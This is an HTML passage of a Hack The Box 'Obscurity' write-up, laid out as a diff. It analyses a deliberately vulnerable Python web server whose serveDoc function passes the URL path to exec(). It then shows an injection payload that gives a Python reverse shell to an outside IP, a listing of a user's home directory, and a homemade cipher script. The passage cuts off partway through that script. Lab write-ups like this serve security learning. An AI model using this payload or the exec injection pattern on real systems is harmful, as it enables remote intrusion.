+        <span class="n">method</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">vers</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">" "</span><span class="p">)</span>
+        <span class="n">header</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">headerDict</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span>
+            <span class="n">pos</span> <span class="o">=</span> <span class="n">param</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">param</span><span class="p">[:</span><span class="n">pos</span><span class="p">],</span> <span class="n">param</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span>
+            <span class="n">headerDict</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="n">key</span><span class="p">:</span> <span class="n">val</span><span class="p">})</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s">"method"</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span> <span class="s">"doc"</span><span class="p">:</span> <span class="n">doc</span><span class="p">,</span> <span class="s">"vers"</span><span class="p">:</span> <span class="n">vers</span><span class="p">,</span> <span class="s">"header"</span><span class="p">:</span> <span class="n">headerDict</span><span class="p">,</span> <span class="s">"body"</span><span class="p">:</span> <span class="n">body</span><span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Server</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">client</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+            <span class="n">client</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">listenToClient</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">address</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">listenToClient</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
+        <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">data</span><span class="p">:</span>
+                    <span class="c1"># Set the response to echo back the recieved data
+</span>                    <span class="n">req</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+                    <span class="bp">self</span><span class="o">.</span><span class="n">handleRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span>
+                    <span class="n">client</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
+                    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">raise</span> <span class="n">error</span><span class="p">(</span><span class="s">'Client disconnected'</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
+                <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">handleRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">conn</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">good</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="p">)</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">doc</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">' '</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"from {0}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">address</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">doc</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
+            <span class="n">statusNum</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"status"</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="s">"/errors/400.html"</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span>
+            <span class="n">statusNum</span> <span class="o">=</span> <span class="s">"400"</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span>
+
+        <span class="n">statusCode</span><span class="o">=</span><span class="n">CODES</span><span class="p">[</span><span class="n">statusNum</span><span class="p">]</span>
+        <span class="n">dateSent</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="n">server</span> <span class="o">=</span> <span class="s">"BadHTTPServer"</span>
+        <span class="n">modified</span> <span class="o">=</span> <span class="s">""</span>
+        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
+        <span class="n">contentType</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s">"mime"</span><span class="p">]</span> <span class="c1"># Try and identify MIME type from string
+</span>        <span class="n">connectionType</span> <span class="o">=</span> <span class="s">"Closed"</span>
+
+
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">Response</span><span class="p">(</span>
+        <span class="n">statusNum</span> <span class="o">=</span> <span class="n">statusNum</span><span class="p">,</span> <span class="n">statusCode</span><span class="o">=</span><span class="n">statusCode</span><span class="p">,</span>
+        <span class="n">dateSent</span> <span class="o">=</span> <span class="n">dateSent</span><span class="p">,</span> <span class="n">server</span> <span class="o">=</span> <span class="n">server</span><span class="p">,</span>
+        <span class="n">modified</span> <span class="o">=</span> <span class="n">modified</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">,</span>
+        <span class="n">contentType</span> <span class="o">=</span> <span class="n">contentType</span><span class="p">,</span> <span class="n">connectionType</span> <span class="o">=</span> <span class="n">connectionType</span><span class="p">,</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">body</span>
+        <span class="p">)</span>
+
+        <span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">stringResponse</span><span class="p">()</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="k">return</span> <span class="mi">0</span>
+
+    <span class="k">def</span> <span class="nf">serveDoc</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">):</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
+</span>            <span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?
+</span>            <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span> <span class="o">+</span> <span class="n">info</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">==</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="n">cwd</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">))</span>
+            <span class="n">docRoot</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">cwd</span><span class="p">,</span> <span class="n">docRoot</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span><span class="p">:</span>
+                <span class="n">path</span> <span class="o">=</span> <span class="s">"/index.html"</span>
+            <span class="n">requested</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">requested</span><span class="p">):</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="n">mimetypes</span><span class="o">.</span><span class="n">guess_type</span><span class="p">(</span><span class="n">requested</span><span class="p">)</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="p">(</span><span class="n">mime</span> <span class="k">if</span> <span class="n">mime</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="bp">None</span> <span class="k">else</span> <span class="s">"text/html"</span><span class="p">)</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="n">MIMES</span><span class="p">[</span><span class="n">requested</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="n">status</span> <span class="o">=</span> <span class="s">"200"</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">,</span> <span class="s">"404.html"</span><span class="p">)</span>
+                <span class="n">mime</span> <span class="o">=</span> <span class="s">"text/html"</span>
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">status</span> <span class="o">=</span> <span class="s">"404"</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+            <span class="n">errorPage</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">docRoot</span><span class="p">,</span> <span class="s">"errors"</span><span class="p">,</span> <span class="s">"500.html"</span><span class="p">)</span>
+            <span class="n">mime</span> <span class="o">=</span> <span class="s">"text/html"</span>
+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">errorPage</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="n">status</span> <span class="o">=</span> <span class="s">"500"</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s">"body"</span><span class="p">:</span> <span class="n">data</span><span class="p">,</span> <span class="s">"mime"</span><span class="p">:</span> <span class="n">mime</span><span class="p">,</span> <span class="s">"status"</span><span class="p">:</span> <span class="n">status</span><span class="p">}</span></code></pre></figure>
+
+<p>Simply, the given code contains three classes:</p>
+<ol>
+  <li><strong>Response</strong> class to handle parse the responses with the given data.</li>
+  <li><strong>Request</strong> class also to parse the incomming requests.</li>
+  <li><strong>Server</strong> class the actual listeining main server with some functions to handle the web requests and documents (pages).</li>
+</ol>
+
+<p>After analysing the code, we noticed some interesting lines in <strong>Server</strong> class that may lead to get an <strong>RCE</strong> on the machine.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">info</span> <span class="o">=</span> <span class="s">"output = 'Document: {}'"</span> <span class="c1"># Keep the output for later debug
+</span><span class="k">exec</span><span class="p">(</span><span class="n">info</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="c1"># This is how you do string formatting, right?</span></code></pre></figure>
+
+<p>The function <code class="highlighter-rouge">serveDoc</code> takes two inputs <code class="highlighter-rouge">path</code> from the web page and <code class="highlighter-rouge">docRoot</code> the documents root folder on the box. Then, the <code class="highlighter-rouge">handleRequest</code> function takes three arguments <code class="highlighter-rouge">request</code> the incoming request, <code class="highlighter-rouge">conn</code> the client connection object, and <code class="highlighter-rouge">address</code> the host and port of the client. After that it calls the <code class="highlighter-rouge">serveDoc</code> function with the request path and document folder <code class="highlighter-rouge">DocRoot</code>.</p>
+
+<p>After the <code class="highlighter-rouge">serveDoc</code> function takes the inputs, <strong>URL</strong> decode the <code class="highlighter-rouge">path</code> and it calls <code class="highlighter-rouge">exec</code> function with <code class="highlighter-rouge">output = 'Document: {path}'</code>. And we know that we can control the path variable from the web page, so now first thing we should do is to test this in our machine to understand how it works then try it in the remote host.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>I made two lines of code to connect to the server locally.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">SuperSecureServer</span> <span class="kn">import</span> <span class="n">Server</span>
+<span class="n">app</span> <span class="o">=</span> <span class="n">Server</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span><span class="mi">9001</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">listen</span><span class="p">()</span></code></pre></figure>
+
+<p>Also let’s create some files (pages) to imitate the actual server. Now, we should bypass the special char <code class="highlighter-rouge">'</code> then try to excute some commands. It’s ok if you stuck at this point for some time just to understand how to exploit it.</p>
+
+<p>Firstly, let’s try some paths to test the server then jump into the exploit. In the exploit we can add a single quote and a semicolon to terminate the string, then add some <strong>Python</strong> code to execute and a hash to comment anything after that command as following  <code class="highlighter-rouge">';print(5+5)#</code>, so let’s encode it and send it with <code class="highlighter-rouge">burp</code>. I used <strong>Burp Suite</strong> to make the requests you can use any tool you want.</p>
+
+<p><a href="/assets/documentation/hack-the-box/obscurity/local_exploit-a741be97d21af2cc2b40ab82d59deecca2009372717de91ac34bbf9f95a6fe0b.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/local_exploit-a741be97d21af2cc2b40ab82d59deecca2009372717de91ac34bbf9f95a6fe0b.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/local_exploit-a741be97d21af2cc2b40ab82d59deecca2009372717de91ac34bbf9f95a6fe0b.png" data-zooming-width="1920" data-zooming-height="1053" />
+</a></p>
+
+<p>Oh! that’s cool it executed the <code class="highlighter-rouge">print(5+5)</code> and it prints <code class="highlighter-rouge">10</code> to the terminal. Now, let’s get some <strong>Python</strong> one line reverse shell, put it instead of <code class="highlighter-rouge">print</code>, and exploit the remote server. Here’s our payload:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">';</span>import socket,subprocess,os<span class="p">;</span><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span><span class="p">;</span>s.connect<span class="o">((</span><span class="s2">"10.10.0.1"</span>,1337<span class="o">))</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span><span class="p">;</span>os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span><span class="p">;</span><span class="nv">p</span><span class="o">=</span>subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>,<span class="s2">"-i"</span><span class="o">])</span><span class="p">;</span><span class="c">#</span></code></pre></figure>
+
+<p>And after executing the payload we gained a shell as <code class="highlighter-rouge">www-data</code>.</p>
+
+<p><a href="/assets/documentation/hack-the-box/obscurity/remote_exploit-1de7d8079e018d3971940f9fc842de323868903477f9cba7b98d60773d454818.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/remote_exploit-1de7d8079e018d3971940f9fc842de323868903477f9cba7b98d60773d454818.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/remote_exploit-1de7d8079e018d3971940f9fc842de323868903477f9cba7b98d60773d454818.png" data-zooming-width="1920" data-zooming-height="1055" />
+</a></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="1-own-user">1. Own User</h3>
+<p>In this part let’s dig deep into the system and search for any things that seem important to escalate our privilege.
+In the <code class="highlighter-rouge">/home/robert</code> folder there are some interesting readable files.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">www-data@obscure:/home/robert$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-al</span>
+<span class="go">total 68
+drwxr-xr-x 7 robert robert 4096 May  9 08:07 .
+drwxr-xr-x 3 root   root   4096 Sep 24  2019 ..
+</span><span class="gp">lrwxrwxrwx 1 robert robert    9 Sep 28  2019 .bash_history -&gt;</span><span class="w"> </span>/dev/null
+<span class="go">-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
+drwx------ 2 robert robert 4096 Oct  3  2019 .cache
+-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
+drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
+drwx------ 3 robert robert 4096 Oct  3  2019 .gnupg
+drwxrwxr-x 3 robert robert 4096 Oct  3  2019 .local
+-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
+-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
+-rwx------ 1 robert robert   33 Sep 25  2019 user.txt</span></code></pre></figure>
+
+<p>After copying the files using <code class="highlighter-rouge">netcat</code> into our machine. The first file <code class="highlighter-rouge">SuperSecureCrypt.py</code> a simple <strong>Python</strong> encryption script to encrypt data with a given key.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">encrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">encrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">encrypted</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">keyPos</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+        <span class="n">keyChr</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">keyPos</span><span class="p">]</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+        <span class="n">newChr</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="n">newChr</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">keyChr</span><span class="p">))</span> <span class="o">%</span> <span class="mi">255</span><span class="p">)</span>
+        <span class="n">decrypted</span> <span class="o">+=</span> <span class="n">newChr</span>
+        <span class="n">keyPos</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">keyPos</span> <span class="o">=</span> <span class="n">keyPos</span> <span class="o">%</span> <span class="n">keylen</span>
+    <span class="k">return</span> <span class="n">decrypted</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Encrypt with 0bscura</span><span class="se">\'</span><span class="s">s encryption algorithm'</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="s">'InFile'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'The file to read'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-o'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="s">'OutFile'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'Where to output the encrypted/decrypted file'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-k'</span><span class="p">,</span>
+                    <span class="n">metavar</span><span class="o">=</span><span class="s">'Key'</span><span class="p">,</span>
+                    <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+                    <span class="n">help</span><span class="o">=</span><span class="s">'Key to use'</span><span class="p">,</span>
+                    <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Decrypt mode'</span><span class="p">)</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">banner</span> <span class="o">=</span> <span class="s">"########################</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="s">"#           BEGINNING          #</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="s">"#    SUPER SECURE ENCRYPTOR    #</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span><span class="o">+=</span> <span class="s">"########################</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  #####################</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  #        FILE MODE         #</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">banner</span> <span class="o">+=</span> <span class="s">"  #####################"</span>
+<span class="k">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">o</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">k</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">i</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Missing args"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">d</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Opening file {0}..."</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">i</span><span class="p">))</span>
